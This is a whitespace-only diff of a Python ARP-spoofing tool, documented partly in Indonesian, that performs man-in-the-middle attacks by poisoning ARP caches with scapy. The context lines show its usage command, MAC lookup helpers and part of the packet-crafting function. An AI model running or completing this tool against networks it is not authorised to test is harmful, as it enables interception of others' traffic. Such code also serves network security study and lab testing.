@@ -4,6 +4,7 @@ ARP Spoofer - Man-in-the-Middle attack via ARP cache poisoning
 Melakukan ARP poisoning untuk MITM attack.
 Usage: sudo python arp_spoofer.py -t 192.168.1.5 -g 192.168.1.1
 """
+
 import argparse
 import sys
 import os
@@ -22,6 +23,7 @@ def get_mac(ip):
     """Get MAC address of IP via ARP"""
     try:
         from scapy.all import getmacbyip, ARP, Ether, srp
+
         mac = getmacbyip(ip)
         if mac:
             return mac
@@ -40,6 +42,7 @@ def get_mac(ip):
 def arp_spoof(target_ip, host_ip, target_mac, host_mac, interface, restore=False):
     """Send ARP packet to poison target's cache"""
     from scapy.all import ARP, Ether, sendp
+
     if restore:
         # Restore legitimate ARP
         packet = Ether(dst=target_mac) / ARP(
@@ -64,6 +67,7 @@ def arp_spoof(target_ip, host_ip, target_mac, host_mac, interface, restore=False
 def get_if_mac(interface):
     try:
         from scapy.all import get_if_hwaddr
+
         return get_if_hwaddr(interface)
     except:
         return "00:00:00:00:00:00"
@@ -142,4 +146,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
